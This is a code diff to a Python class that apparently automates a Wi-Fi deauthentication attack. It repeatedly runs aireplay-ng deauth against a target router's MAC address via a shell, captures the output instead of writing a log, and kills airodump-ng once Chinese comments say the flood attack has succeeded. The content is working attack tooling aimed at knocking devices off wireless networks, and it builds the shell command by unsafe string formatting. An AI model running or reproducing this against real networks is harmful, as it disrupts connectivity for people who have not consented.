@@ -13,24 +13,16 @@ class ROUTE:
 
     def __init__(self, mac):
         # self.routeattack = os.path.join(filedir, 'routrattack', 'routeattack.log')
-        self.routeattack = '/home/routeattack.log'
+        self.logpath = "/home/execute.log"
         self.mac = mac
         self.limit = 20
 
     # 保存shell的所有输出
     def writeinfotolog(self):
         cmd = 'aireplay-ng --deauth 10 -a {} wlan0mon'.format(self.mac)
-        fdout = open(self.routeattack, 'a')
-        fderr = open(self.routeattack, 'a')
-        p = subprocess.Popen(cmd, stdout=fdout, stderr=fderr, shell=True)
-        if p.poll():
-            return
-        p.wait()
-        return
-
-    def delthelog(self):
-        cmd = 'rm -f {}'.format(self.routeattack)
-        subprocess.call(cmd, shell=True)
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+        output, err = p.communicate()
+        return output
 
     def killairodump(self):
         subprocess.call("ps -ef|grep airodump-ng|grep -v grep|cut -c 9-15|xargs kill -s 9", shell=True)
@@ -44,19 +36,14 @@ class ROUTE:
                 break
             count += 1
             # 写入文件前删除可能存在的log
-            self.delthelog()
-            self.writeinfotolog()
-            time.sleep(0.5)
-            file = open(self.routeattack).read()
-            router = re_route.findall(file)
+            strtext = self.writeinfotolog()
+            router = re_route.findall(strtext)
             # 泛洪攻击没有成功则停0.5s继续
             if len(router) == 0:
                 time.sleep(0.1)
             else:
+                # 泛洪攻击成功后停止程序
+                time.sleep(2)
                 break
-        # 删除本地的log文件
-        self.delthelog()
-        # 泛洪攻击成功后停止程序
-        time.sleep(2)
         self.killairodump()
         return
